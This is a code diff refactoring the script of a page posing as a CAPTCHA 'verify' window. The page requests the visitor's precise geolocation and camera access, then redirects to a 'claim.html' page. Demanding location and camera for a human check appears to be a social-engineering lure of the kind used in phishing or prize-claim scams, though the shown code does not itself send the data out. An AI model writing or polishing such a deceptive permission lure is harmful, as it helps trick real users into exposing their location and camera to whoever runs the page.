@@ -68,22 +68,68 @@
         <img src="images/captcha_arrow.svg" alt="" class="verify-window-arrow" id="verify-window-arrow"/>
       </div>
       <script>
-      document.getElementById('verify-verify-button').addEventListener('click', async () => {
-        try {
-          await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject);
-          });
-          await navigator.mediaDevices.getUserMedia({ video: true });
-          document.getElementById('spinner').src = "images/checkmark.png";
-          setTimeout(() => {
-            window.location.href = "claim.html";
-          }, 2000);
+  function getElement(id) {
+    const element = document.getElementById(id);
+    if (!element) {
+      console.error(`Element with ID "${id}" not found.`);
+      return null;
+    }
+    return element;
+  }
+  function isGeolocationSupported() {
+    return 'geolocation' in navigator;
+  }
 
-        } catch (err) {
-          alert("Akses kamera atau lokasi ditolak. Verifikasi gagal.");
-        }
+  function isMediaDevicesSupported() {
+    return 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices;
+  }
+  async function handleVerification() {
+    const verifyButton = getElement('verify-verify-button');
+    const spinner = getElement('spinner');
+
+    if (!verifyButton || !spinner) {
+      alert('Required elements are missing on the page.');
+      return;
+    }
+
+    try {
+      if (!isGeolocationSupported()) {
+        throw new Error('Geolocation is not supported by this browser.');
+      }
+      await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true,
+          timeout: 10000, 
+          maximumAge: 0 
+        });
       });
-    </script>
+      if (!isMediaDevicesSupported()) {
+        throw new Error('Camera access is not supported by this browser.');
+      }
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: true
+      });
+      stream.getTracks().forEach(track => track.stop());
+      spinner.src = 'images/checkmark.png';
+      setTimeout(() => {
+        window.location.href = 'claim.html';
+      }, 2000);
+
+    } catch (err) {
+      console.error('Verification error:', err);
+      alert('Verification failed: ' + (err.message || 'Please allow access to location and camera.'));
+    }
+  }
+
+  document.addEventListener('DOMContentLoaded', () => {
+    const verifyButton = getElement('verify-verify-button');
+    if (verifyButton) {
+      verifyButton.addEventListener('click', handleVerification);
+    } else {
+      console.error('Verify button not found on page load.');
+    }
+  });
+</script>
       <script src="data.js"></script>
       <script src="captcha.js"></script>
       <script type="text/javascript">
